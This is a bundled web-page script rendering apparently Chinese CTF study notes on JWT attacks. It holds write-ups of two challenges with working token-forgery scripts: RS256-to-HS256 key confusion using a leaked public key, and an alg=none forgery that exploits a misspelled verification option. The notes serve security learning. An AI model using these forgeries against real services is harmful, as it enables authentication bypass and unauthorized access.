(window.webpackJsonp=window.webpackJsonp||[]).push([[28],{748:function(s,n,e){"use strict";e.r(n);var a=e(103),t=Object(a.a)({},(function(){var s=this,n=s.$createElement,e=s._self._c||n;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"jwt"}},[s._v("JWT "),e("a",{staticClass:"header-anchor",attrs:{href:"#jwt"}},[s._v("#")])]),s._v(" "),e("p",[s._v("JWT 的通常加密方式有 RS 和 HS")]),s._v(" "),e("p",[s._v("将加密后的内容复制到 https://jwt.io/ 即可看到解密后的结果和加密方式")]),s._v(" "),e("p",[s._v("其中 RS 是需要需要公私钥的，HS 是对称加密")]),s._v(" "),e("h2",{attrs:{id:"攻击方法"}},[s._v("攻击方法 "),e("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")])]),s._v(" "),e("p",[s._v("HS 可以使用 https://github.com/brendan-rius/c-jwt-cracker 工具进行爆破")]),s._v(" "),e("p",[s._v("RS 验证配置错误，公钥泄露")]),s._v(" "),e("p",[s._v("加密方式设置为 none")]),s._v(" "),e("h2",{attrs:{id:"例题"}},[s._v("例题： "),e("a",{staticClass:"header-anchor",attrs:{href:"#例题"}},[s._v("#")])]),s._v(" "),e("h3",{attrs:{id:"hsctf-broken-tokens"}},[s._v("HSCTF [Broken Tokens] "),e("a",{staticClass:"header-anchor",attrs:{href:"#hsctf-broken-tokens"}},[s._v("#")])]),s._v(" "),e("p",[s._v("源码：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('import jwt\nimport base64\nimport os\nimport hashlib\nfrom flask import Flask, render_template, make_response, request, redirect\napp = Flask(__name__)\nFLAG = os.getenv("FLAG")\nPASSWORD = os.getenv("PASSWORD")\nwith open("privatekey.pem", "r") as f:\n\tPRIVATE_KEY = f.read()\nwith open("publickey.pem", "r") as f:\n\tPUBLIC_KEY = f.read()\n\n@app.route(\'/\', methods=[\'GET\', \'POST\'])\ndef index():\n\tif request.method == "POST":\n\t\tresp = make_response(redirect("/"))\n\t\tif request.form["action"] == "Login":\n\t\t\tif request.form["username"] == "admin" and request.form["password"] == PASSWORD:\n\t\t\t\tauth = jwt.encode({"auth": "admin"}, PRIVATE_KEY, algorithm="RS256")\n\t\t\telse:\n\t\t\t\tauth = jwt.encode({"auth": "guest"}, PRIVATE_KEY, algorithm="RS256")\n\t\t\tresp.set_cookie("auth", auth)\n\t\telse:\n\t\t\tresp.delete_cookie("auth")\n\t\t\n\t\treturn resp\n\telse:\n\t\tauth = request.cookies.get("auth")\n\t\tif auth is None:\n\t\t\tlogged_in = False\n\t\t\tadmin = False\n\t\telse:\n\t\t\tlogged_in = True\n\t\t\tadmin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"\n\t\tresp = make_response(\n\t\t\trender_template("index.html", logged_in=logged_in, admin=admin, flag=FLAG)\n\t\t)\n\treturn resp\n\n@app.route("/publickey.pem")\ndef public_key():\n\twith open("./publickey.pem", "r") as f:\n\t\tresp = make_response(f.read())\n\t\tresp.mimetype = \'text/plain\'\n\t\treturn resp\n\nif __name__ == "__main__":\n\tapp.run()\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br")])]),e("p",[s._v("大致就是登录时验证的是私钥，然后登录后验证的是公钥，然后公钥可以通过 /publickey.pem 获取")]),s._v(" "),e("p",[s._v("先登录成 guest，这时 Token 是")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("解密后信息部分是")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('{ "auth": "guest" }\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("然后再加密下")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('#!/usr/bin/env python\nimport jwt\nimport base64\n\nwith open("publickey.pem", "r") as f:\n\tPUBLIC_KEY = f.read()\nprint(jwt.encode({"auth":"admin"}, key=PUBLIC_KEY, algorithm=\'HS256\'))\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("p",[s._v("如果出错了就把报错地方注释掉 ( algorithms.py )")]),s._v(" "),e("p",[s._v("改成")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("def prepare_key(self, key):\n        key = force_bytes(key)\n        return key\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("原因是不能用公钥加密")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("flag{1n53cur3_tok3n5_5474212}\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("h3",{attrs:{id:"hfctf-easylogin"}},[s._v("HFCTF [EasyLogin] "),e("a",{staticClass:"header-anchor",attrs:{href:"#hfctf-easylogin"}},[s._v("#")])]),s._v(" "),e("p",[s._v("在源码中可以发现 app.js，可以判断是 node.js")]),s._v(" "),e("p",[s._v("在备注中发现")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("或许该用 koa-static 来处理静态文件\n路径该怎么配置？不管了先填个根目录XD\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("静态文件，根目录，那是不是可以直接访问")]),s._v(" "),e("p",[s._v("于是直接访问根目录下的 app.js，成功读取源码")]),s._v(" "),e("p",[s._v("根据 /static/js/app.js 中")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("function getflag() {\n    $.get('/api/flag').done(function(data) {\n        const {flag} = data;\n        $(\"#username\").val(flag);\n    }).fail(function(xhr, textStatus, errorThrown) {\n        alert(xhr.responseJSON.message);\n    });\n}\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[s._v("以及 /app.js 中")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("// add controllers:\napp.use(controller());\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[s._v("还有 koa 框架的文件结构可知")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("app.js          入口文件\nconfig          项目路由文件夹\nmodels          对应的数据库表结构\nDataBase        保存数据库封装的CRUD操作方法\ncontrollers     项目控制器目录接受请求处理逻辑\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("p",[s._v("访问 /controllers/api.js 可得到逻辑源码")]),s._v(" "),e("p",[s._v("代码中关键功能有：")]),s._v(" "),e("p",[s._v("获得 flag 的功能，SESSION[username] == admin 就能获得")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("'GET /api/flag': async (ctx, next) => {\n    if(ctx.session.username !== 'admin'){\n        throw new APIError('permission error', 'permission denied');\n    }\n    const flag = fs.readFileSync('/flag').toString();\n    ctx.rest({\n        flag\n    });\n    await next();\n},\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br")])]),e("p",[s._v("注册的功能，很明显这里不让注册用户名为 admin 的用户，同时会根据用户生成一个 JWT 口令")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("'POST /api/register': async (ctx, next) => {\n    const {username, password} = ctx.request.body;\n    if(!username || username === 'admin'){\n        throw new APIError('register error', 'wrong username');\n    }\n    if(global.secrets.length > 100000) {\n        global.secrets = [];\n    }\n    const secret = crypto.randomBytes(18).toString('hex');\n    const secretid = global.secrets.length;\n    global.secrets.push(secret)\n    const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n    ctx.rest({\n        token: token\n    });\n    await next();\n},\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br")])]),e("p",[s._v("登录的功能")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("'POST /api/login': async (ctx, next) => {\n    const {username, password} = ctx.request.body;\n    if(!username || !password) {\n        throw new APIError('login error', 'username or password is necessary');\n    }\n    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n    const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n    console.log(sid)\n\n    if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n        throw new APIError('login error', 'no such secret id');\n    }\n    const secret = global.secrets[sid];\n    const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n    const status = username === user.username && password === user.password;\n    if(status) {\n        ctx.session.username = username;\n    }\n    ctx.rest({\n        status\n    });\n    await next();\n},\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br")])]),e("p",[s._v("这里识别用户身份的方法是，在注册时随机生成一个密钥，存入数组，并用它来加密 JWT 信息，JWT中储存着密钥的数组下标和用户名密码")]),s._v(" "),e("p",[s._v("（ JWT主要的功能是确认来源，防止伪造数据 ）")]),s._v(" "),e("p",[s._v("然后登录时解密第一部分，获得 JWT 中储存的信息，然后根据数组下标获得密钥，然后根据密钥解密数据，比对解密前后的用户名密码是否相同")]),s._v(" "),e("p",[s._v("这里存在的一个漏洞点是，在 JWT 的 jsonwebtoken 库中，接收的参数是 algorithms 而这里写的是 algorithm，这里跳过了验证")]),s._v(" "),e("p",[s._v("并且，当解密时没有密钥，同时加密方式为 none 的时候，会忽视后面的解密算法，按 none 方式解密")]),s._v(" "),e("p",[s._v("所以我们这里要把 JWT 信息解密后的数组下标替换成小数即可将密钥置空，之后就可以修改数值了")]),s._v(" "),e("p",[s._v("JWT 信息部分解密后为")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('{"secretid":4,"username":"111222","password":"111222"}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("所以这里修改为")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('{"secretid":0.4,"username":"111222","password":"111222"}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("之后通过脚本重新加密")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('import jwt\n\ntoken = jwt.encode({"secretid":0.4,"username":"admin","password":"admin"},algorithm="none",key="").decode(\'utf-8\')\nprint(token)\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[s._v("将 POST 数据包中的 authorization 内容替换即可以 admin 登录获取 flag")])])}),[],!1,null,null,null);n.default=t.exports}}]);